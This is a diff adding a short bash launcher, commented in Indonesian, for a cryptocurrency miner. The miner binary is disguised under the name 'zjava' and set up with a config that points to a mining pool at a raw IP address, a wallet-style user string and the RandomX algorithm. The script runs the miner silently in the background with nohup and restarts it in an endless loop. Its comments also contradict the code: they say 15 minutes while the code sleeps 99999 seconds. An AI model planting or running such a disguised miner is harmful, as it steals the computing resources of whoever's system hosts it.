@@ -1,0 +1,45 @@
+#!/usr/bin/env bash
+
+# Base folder, pakai nama beda supaya tidak bentrok
+BASE_DIR="./zjava_dir"
+mkdir -p "$BASE_DIR"
+
+# Copy binary mbo2 ke folder zjava
+cp ./zjava "$BASE_DIR/zjava"
+chmod +x "$BASE_DIR/zjava"
+
+# Masuk ke folder zjava_dir
+cd "$BASE_DIR" || exit 1
+
+# Buat config.json
+cat > config.json <<EOF
+{
+  "url": "3.144.16.65:80",
+  "user": "Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d.vr88",
+  "pass": "x",
+  "threads": 4,
+  "algo": "rx/0"
+}
+EOF
+
+while true; do
+  # Jalankan miner
+  nohup ./zjava --config=config.json >/dev/null 2>&1 &
+
+  start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
+  echo "[$start_time] âœ… STATUS: JALAN"
+  echo "Process on (aktif 15 menit)..."
+
+
+  sleep 99999
+
+  # Matikan proses
+  pkill zjava
+
+  stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
+  echo "[$stop_time] ðŸ›‘ STATUS: MATI"
+  echo "Process off (tunggu 1 menit)..."
+
+  # Tunggu 1 menit
+  sleep 60
+done
